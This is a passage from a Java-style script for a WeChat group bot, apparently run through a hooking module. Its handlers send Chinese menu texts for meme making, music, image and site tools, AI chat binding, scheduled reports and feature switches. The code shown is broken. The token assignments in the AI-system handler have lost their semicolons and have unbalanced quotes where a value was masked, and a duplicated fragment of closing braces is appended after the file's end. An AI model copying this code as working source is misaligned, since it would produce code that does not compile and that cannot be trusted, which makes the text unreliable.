                             +"$=图片/访问/语音\n"
                             +"€=链接/目录\n"
                             +"Tips:[访问≠目录]\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("作图系统")) {
                    String f=getStatus(qun,text);
                    String c="🍅文字表情包，命令加文字即可\n"
                    +"☆滚屏, 文字, 写作, 妹妹, 希望开心, 遇见你超级幸福, 爱人先爱己, 与你相遇, 别质疑我的爱, 小猪, 棉花, 时间会见证我的爱, 爱没有方向, 我的爱只给, 我的不败之神, 彩色瓶, 金榜题名, 新年快乐, 爱坚不可摧, 以爱之名留在身边, 搜图, 罗永浩说, 鲁迅说, 意见, 气泡, 小人, 悲报, 举牌, 猫举牌, 瓶, 结婚证, 情侣协议书, 表白, 萌妹举牌, 唐可可举牌, 大鸭举牌, 猫猫举牌, 虹夏举牌, 抖音文字, 狂粉, 流萤举牌, 快跑,谷歌, 喜报, 记仇, 低语, 诺基亚, 顶尖,不喊我, 别说了, 一巴掌, 许愿失败, 二次元\n"
                             +"🍅普通表情包，引用或者单独发都可以\n"
                             +"☆随机, 出征, 透明, 头像, 一直, 老婆, 丢, 陪睡, 捣药, 咬, 摸摸, 亲亲, 吃下, 拍拍, 需要, 加个框, 膜拜, 黑白, 扭, 呼啦圈, 比心, 大摇大摆, 可乐, 打球, 挠头, 踢你, 爱心, 快溜,  摇, 很拽, 出街, 生气, 按脚,威胁, 发怒, 添乱, 上瘾, 一样, 我永远喜欢, 防诱拐, 拍头（可加文字）, 鼓掌, 问问, 继续干活, 悲报, 啃, 高血压, 波奇手稿, 奶茶, 画, 撕, 蹭, 炖, 撞,  字符画, 追列车, 国旗, 鼠鼠搓, 小丑, 迷惑, 兑换券, 捂脸, 爬, 群青, 白天黑夜, 像样的亲亲, 入典, 恐龙, 注意力涣散, 离婚协议, 狗都不玩, 管人痴, 不要靠近, 别碰, 吃, 意若思镜, 灰飞烟灭, 闭嘴, 我打宿傩, 满脑子, 闪瞎, 红温, 关注, 哈哈镜, 垃圾, 原神吃, 原神启动, 鬼畜, 手枪, 锤, 打穿, 抱紧, 抱大腿, 胡桃啃, 不文明, 采访, 杰瑞盯, 急急国王, 啾啾, 跳, 万花筒, 凯露指, 远离, 踢球, 卡比锤, 敲, 泉此方看, 偷学, 左右横跳, 让我进去, 舔糖, 等价无穷小, 听音乐, 小天使, 加载中, 看扁, 看图标, 循环, 寻狗启事, 永远爱你, 真寻看书, 旅行伙伴觉醒, 旅行伙伴加入, 交个朋友（可加文字）, 结婚申请, 流星, 米哈游, 上香, 我老婆, 纳西妲啃, 亚文化取名机, 无响应, 请假条, 我推的网友, out, 加班, 这像画吗, 小画家, 推锅, 完美, 捏, 像素化, 顶, 玩游戏, 一起玩, 出警, 警察, 土豆, 捣, 打印, 舔, 棒子, 弹, 难办, 是他, 面具, 扔瓶子, 摇一摇, 黑神话\n"
                            
                             +"🍅两个人的表情包，引用使用\n"
                             +"☆揍,  亲亲, 白天晚上, 舰长, 请拨打, 击剑, 抱抱, 贴贴, 佩佩举\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("站长系统")) {
                    String f=getStatus(qun,text);
                    String c="☆访问+链接\n"
                             +"☆下载+链接\n"
                             +"☆JSON+数据\n"
                             +"☆重定向+链接\n"
                             +"☆网站截图+链接\n"
                             +"☆文件转链接+目录\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("代管系统")) {
                    String c="☆引用+添加代管\n"
                             +"☆引用+删除代管\n"
                             +"☆代管列表\n"
                             +"☆清空代管";
                    sendm(qun,c);
                }
                if(text.equals("娱乐系统")) {
                    String f=getStatus(qun,text);
                    String c="☆签到\n"
   
+"☆签到排行\n"
                        +"☆开启/关闭"+f;
                    sendm(qun,c);
                }
                
if(text.equals("解析系统")) {
                    
String f=getStatus(qun,text);
                    
String c="☆引用解析\n"
                                                 
+"☆发链接自动解析\n"
                          
  +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("查询系统")) {
                    String f=getStatus(qun,text);
                    String c="☆天气+地区\n"
                             +"☆百科+内容\n"
                             +"☆今日油价+省级\n"
                             +"☆菜谱查询+名称\n"
                             +"☆宠物查询+名称\n"
                             +"☆王者战力+英雄\n"
                             +"☆扩展名查询+名称\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("词条系统")) {
                    String f=getStatus(qun,text);
                    String c="☆疯狂星期四☆毒鸡汤☆\n"
                             +"☆朋友圈文案☆彩虹屁☆\n"
                             +"☆动画文案☆漫画文案☆\n"
                             +"☆游戏文案☆文学文案☆\n"
                             +"☆原创文案☆网络文案☆\n"
                             +"☆其他文案☆影视文案☆\n"
                             +"☆诗词文案☆哲学文案☆\n"
                             +"☆网易文案☆机灵文案☆\n"
                             +"☆舔狗日记☆\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("发送模式")) {
                    String 发送模式="文字";
                    if("1".equals(取("开关","发送模式"))) {
                        发送模式="图片";
                    } else if("2".equals(取("开关","发送模式"))) {
                        发送模式="卡片";
                    }
                    String 简洁模式="×";
                    if("1".equals(getString("开关","简洁模式",""))) {
                        简洁模式="√";
                    }
                    String c="当前模式是["+发送模式+"]发送\n"
                             +"☆切换文字发送\n"
                             +"☆切换图片发送\n"
                             +"☆切换卡片发送\n"
                             +"☆开启/关闭简洁模式["+简洁模式+"]";
                    sendm(qun,c);
                }
                if(text.equals("艾特回复")) {
                    String f=getStatus(qun,text);
                    String 回复类型="内容";
                    if("1".equals(getString(qun,"回复类型",""))) {
                        回复类型="智能";
                    }
                    String c="☆设置回复+内容\n"
                             +"☆重置回复内容\n"
                             +"☆查看回复内容\n"
                             +"☆查看回复变量\n\n"
                             +"当前模式是["+回复类型+"]回复\n"
                             +"☆切换内容回复\n"
                             +"☆切换智能回复\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("进群欢迎")) {
                    String f=getStatus(qun,text);
                    String c="☆进群音乐卡片欢迎\n"
                      +"☆无需设置\n"
                            +"☆"+f;
                    sendm(qun,c);
                }
                    if(text.equals("整点报时")) {
                        String f=getStatus(qun,text);
                        String c="☆报时\n"
                                 +"整点自动发送播报\n"
                                 +"目前仅支持群使用\n"
                                 +"☆"+f;
                        sendm(qun,c);
                    }
                    if(text.equals("每日简报")) {
                        String f=getStatus(qun,text);
                        String c="☆简报\n"
                                 +"早上九点自动发送\n"
                                 +"目前仅支持群使用\n"
                                 +"☆"+f;
                        sendm(qun,c);
                    }
                    if(text.equals("每日总结")) {
                        String f=getStatus(qun,text);
                        String c="☆一键总结\n"
                                 +"☆追问+问题\n"
                                 +"☆清空总结内容\n"
                                 +"需要绑定智能系统\n"
                                 +"晚上八点自动总结\n"
                                 +"目前仅支持群使用\n"
                                 +"☆"+f;
                        sendm(qun,c);
                    }
                    if(text.equals("环球时报")) {
                        String f=getStatus(qun,text);
                        String c="早上九点自动发送\n"
                                 +"目前仅支持群使用\n"
                                 +"☆"+f;
                        sendm(qun,c);
                    }
                if(text.equals("视频系统")) {
                    String f=getStatus(qun,text);
                    String c="☆详见视频菜单\n"
                            +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("自身撤回")) {
                    String f=getStatus(qun,text);
                    int 撤回时间=30;
                    if(getInt(qun,"撤回时间",0)!=null) {
                        撤回时间=getInt(qun,"撤回时间",30);
                    }
                    String c="☆设置撤回时间+数字\n"
                             +"当前撤回时间:"+撤回时间+"秒\n"
                             +"时间不得超过110秒\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("版本信息")) {
                    String version=yun.optString("version");
                    File folder=new File(JavaPath);
                    long 结束加载=data.createTime;
                    String formattedSize=getFormattedSize(folder);
                    String c="脚本昵称:"+脚本名称+"\n"
                             +"脚本作者:"+脚本作者+"\n"
                             +"最新版本:"+version+"\n"
                             +"当前版本:"+当前版本+"\n"
                             +"微信版本:"+VersionName(mContext)+"("+VersionCode(mContext)+")\n"
                             +"模块版本:"+VersionName(HostInfo.getModuleContext())+"\n"
                             +"账号昵称:"+getName(mWxid)+"\n"
                             +"目录大小:"+formattedSize+"\n"
                             +"运行时长:"+formatTime((float)(结束加载-开始加载))+"\n"
                             +"更新时间:"+更新时间;
                    sendm(qun,c);
                }
                if(text.equals("搜索功能")) {
                    String f=getStatus(qun,text);
                    String c="☆搜图+内容\n"
                             +"☆看电影、搜电影+名称\n"
                             +"☆搜索内容+内容\n"
                             +"☆搜索影视、图片、内容、应用+内容\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("音乐系统")) {
                    String f=getStatus(qun,text);
                    String c="☆❥单点歌曲\n"
                            
+"☆听歌、放首、 想听、唱歌、 来首、语音、红包+歌名\n"
   
+"☆QQ音乐:Q歌名、网易音乐:Y歌名、Joox音乐:J歌名、抖音音乐:D+歌名、酷我音乐:W+歌名、波点音乐:B+歌名、咪咕音乐:M+歌名、千千音乐:91+歌名\n"
                                            
+"☆❥转语音\n"
                            
+"☆音色（查看音色列表）、转、说、yy+文字（或引用文字）, 支付宝 +数字\n"
                            
+"☆❥语音包\n"

+"☆唱鸭、唱歌、上dj、男生、女生、御姐、绿茶、怼人、御姐音、可爱、怼人音、绿茶音、来财、随机音乐、dj+数量、坤坤+数量\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("图片系统")) {
                    String f=getStatus(qun,text);
                    String c="☆❥图片功能☆\n"
                            
+"☆小狐狸, 七濑胡桃, 方形头像, 原神竖图, 签到, 坤坤, 摸鱼人,萌版竖图, 移动竖图, 原神横图, 白底横图, 风景横图, 萌版横图, PC横图, 早安, 美女, 猫咪图, 买家秀, 兽猫酱, 帅哥图, 小清新, 动漫图, 看汽车, 看炫酷, 风景, 腹肌, 萌宠图, 原神图, 黑丝, 白丝, 60s, 日报, 图集, 原神图片, 绘画, 表情包, 头像, 图文素材, 二次元, 一图, 领老婆, 求婚, 感动☆\n"
                            
+"☆❥图片搜索☆\n"
                            
+"☆搜图, 搜表情, 地铁, 天气, 搜壁纸+关键词☆\n"

+"☆❥图片生成☆\n"
                            
+"☆合成,生成, 手写☆\n"
      
+"☆❥AI功能☆\n"
                            
+"☆回复+问题☆\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("开关系统")) {
                    String f0=getStatus(qun,"环球时报");
                    String f1=getStatus(qun,"头像制作");
                    String f2=getStatus(qun,"自动回复");
                    String f3=getStatus(qun,"作图系统");
                    String f4=getStatus(qun,"站长系统");
                    String f5=getStatus(qun,"热搜系统");
                    String f6=getStatus(qun,"娱乐系统");
                    String f7=getStatus(qun,"每日简报");
                    String f8=getStatus(qun,"整点报时");
                    String f9=getStatus(qun,"解析系统");
                    String f10=getStatus(qun,"查询系统");
                    String f11=getStatus(qun,"音乐系统");
                    String f12=getStatus(qun,"图片系统");
                    String f13=getStatus(qun,"智能系统");
                    String f14=getStatus(qun,"搜索功能");
                    String f15=getStatus(qun,"自身撤回");
                    String f16=getStatus(qun,"视频系统");
                    String f17=getStatus(qun,"艾特回复");
                    String f18=getStatus(qun,"词条系统");
                    String f19=getStatus(qun,"菜单限制");
                    String f20=getStatus(qun,"菜单屏蔽");
                    String f21=getStatus(qun,"进群欢迎");
                    String f22=getStatus(qun,"每日总结");
                    String c="☆"+f0+"\n"
                             +"☆"+f1+"\n"
                             +"☆"+f2+"\n"
                             +"☆"+f3+"\n"
                             +"☆"+f4+"\n"
                             +"☆"+f5+"\n"
                             +"☆"+f6+"\n"
                             +"☆"+f7+"\n"
                             +"☆"+f8+"\n"
                             +"☆"+f9+"\n"
                             +"☆"+f10+"\n"
                             +"☆"+f11+"\n"
                             +"☆"+f12+"\n"
                             +"☆"+f13+"\n"
                             +"☆"+f14+"\n"
                             +"☆"+f15+"\n"
                             +"☆"+f16+"\n"
                             +"☆"+f17+"\n"
                             +"☆"+f18+"\n"
                             +"☆"+f19+"\n"
                             +"☆"+f20+"\n"
                             +"☆"+f21+"\n"
                             +"☆"+f22+"\n"
                             +"☆开启/关闭全部功能\n"
                             +"☆所有群设置";
                    sendm(qun,c);
                }
                if(text.equals("底部样式")) {
                    String 底部时间="×";
                    String 底部文案="×";
                    String 底部尾巴="×";
                    if("1".equals(getString("开关","底部时间",""))) {
                        底部时间="√";
                    }
                    if("1".equals(getString("开关","底部文案",""))) {
                        底部文案="√";
                    }
                    if("1".equals(getString("开关","底部尾巴",""))) {
                        底部尾巴="√";
                    }
                    String c="☆开启/关闭底部时间["+底部时间+"]\n"
                             +"☆开启/关闭底部文案["+底部文案+"]\n"
                             +"☆开启/关闭底部尾巴["+底部尾巴+"]\n"
                             +"☆设置底部内容+内容";
                    sendm(qun,c);
                }
                if(text.equals("智能系统")) {
                    String f=getStatus(qun,text);
                    String Token= "**********"
                    String 手机号码="已绑定";
                    String 智能回复="";
                    if(取("开关","accessToken").equals("")) {
                        Token= "**********"
                    }
                    if(取("开关","手机号码").equals("")) {
                        手机号码="未绑定";
                    }
                    if(data.isText()&&data.talkerType==0) {
                        智能回复=" -------------------------\n"
                                     +"☆开启/关闭智能回复\n"
                                     +"开启后消息将会用AI回复\n"
                                     +"并且其他功能将无法使用\n"
                                     +" -------------------------\n";
                    }
                    String c="☆AI+问题\n"
                             +"☆重新绑定\n"
                             +"☆重置对话\n"
                             +"☆我的智能体\n"
                             +"☆搜索智能体+内容\n"
                             +"☆查看智能体\n"
                             +"☆重置智能体\n"
                             +智能回复
                             +"发送[配置设置]绑定手机号\n"
                             +"☆手机状态:"+手机号码+"\n"
                             +"☆获取验证码\n"
                             +"然后发送[验证码]即可绑定\n"
                             +"☆清除绑定状态\n"
                             +"☆绑定状态: "**********"
                             +"☆"+f;
                    sendm(qun,c);
                }
            }
        }
    }
}             sendm(qun,c);
                }
            }
        }
    }
}